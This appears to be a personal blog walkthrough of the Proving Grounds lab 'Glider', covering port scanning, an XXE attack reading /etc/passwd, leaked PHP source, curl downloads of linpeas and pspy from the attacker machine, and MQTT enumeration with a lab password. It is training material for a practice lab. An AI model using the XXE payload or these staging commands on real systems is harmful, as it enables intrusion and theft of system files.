---
title: Glider
date: 2026-04-29T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - ssh
  - getcap
  - gobuster
  - Caido
  - XXE
  - base64
  - pspy
  - preg_replace
  - linpeas
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Glider"
---
The rain will stop, the night will end, the hurt will fade. Hope is never so lost that it can't be found.

Ernest Hemingway

`nmap 192.168.183.226 -p- -sS -sC -sV -A   --min-rate 5000`

![](Screenshot%202026-04-27%20at%2007.05.08.png)

![](Screenshot%202026-04-27%20at%2007.05.31.png)


![](Screenshot%202026-04-27%20at%2007.10.11.png)

![](Screenshot%202026-04-27%20at%2007.11.00.png)

![](Screenshot%202026-04-27%20at%2007.15.23.png)

Start caido or burp:

This references xml so we'll attempt an xxe(xml external  entity attack)

Navigate to: `http://192.168.203.226/record_xml.php`

Better yet: fill out the form on the demo page, then find the POST request in Caido.

Send the request to replay:

![](Screenshot%202026-04-28%20at%2009.08.50.png)

Add the following, as pictured below:

`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`

`&xxe;`

![](Screenshot%202026-04-28%20at%2008.50.54.png)

steven:x:1000:1000::/home/steven:/bin/sh

![](Screenshot%202026-04-28%20at%2010.57.49.png)

Decode the base64 and view the source code:

Copy into a file called index.txt.

`base64 -d index.txt > dindex.txt`

![](Screenshot%202026-04-29%20at%2010.20.28.png)

This is the vulnerable code we're looking for.

![](Screenshot%202026-04-29%20at%2010.15.40.png)

![](Screenshot%202026-04-29%20at%2010.14.16.png)

Its important to avoid the use of the % character as it is parsed differently. As you can see in the image below there is a %. I can only assume due to the url encoding it isn't being 'replaced'.

![](Screenshot%202026-04-29%20at%2010.15.40.png)

After many hours of looking for a way to structure the payload I found that I could simplify it to this. 

![](Screenshot%202026-04-29%20at%2010.06.14.png)

🚨🐚

![](Screenshot%202026-04-29%20at%2010.25.36.png)

But...... if we url encode it 😈

![](Screenshot%202026-04-29%20at%2010.25.12.png)

![](Screenshot%202026-04-29%20at%2010.28.23.png)

![](Screenshot%202026-04-29%20at%2010.32.25.png)

Discovered a utility called pspy:  
https://github.com/DominicBreuker/pspy/blob/master/README.md



Move pspy and linpeas onto the victim machine.  

kali - updog -p 80`  
victim - `curl http://192.168.45.165/linpeas.sh'  
`curl http://192.168.45.165/pspy64`

Note* I have these commands here to trigger my sieve brain, also its good to practice typing them out. They're going to be different for you depending on where your files are and your IP address.


![](Screenshot%202026-04-30%20at%2007.28.47.png)

![](Screenshot%202026-04-30%20at%2007.28.01.png)

![](Pasted%20image%2020260430082039.png)

**Binary Functions**

/usr/bin/mosquitto_rr: A "request-response" client used to send a message and wait for a single response back, facilitating a two-way communication pattern over MQTT.

/usr/bin/mosquitto_sub: A command-line client that subscribes to specific topics and prints the messages it receives in real-time.

/usr/bin/mosquitto_ctrl: A tool for managing and controlling a Mosquitto broker instance, such as managing users, roles, and ACLs (Access Control Lists) dynamically.

/usr/bin/mosquitto_passwd: A utility used to create and manage the encrypted password files used by the broker for basic authentication.

/usr/bin/mosquitto_pub: A command-line client that publishes a single message to a specific topic and then exits.

/usr/sbin/mosquitto: The actual MQTT broker (server) daemon that handles all message routing, client connections, and authentication.


6 binaries, the one used in the pspy output is mosquitto_pub.

To enumerate mosquitto with no credendials: mosquitto_sub -h localhost -t "#" -v

![](Screenshot%202026-04-30%20at%2008.25.49.png)

with creds:  
`mosquitto_sub -u steven -P wannabeinacatfight92 -t "#" -v`

![](Screenshot%202026-04-30%20at%2008.30.25.png)

I didn't get this.... 

The syntax from the pspy output is wrong. If you read the 'help' carefully - it will tell you that the syntax must be; host, user, password, topic. So the correct command is  

![](Screenshot%202026-04-30%20at%2007.58.35.png)

![](Screenshot%202026-04-30%20at%2008.00.46.png)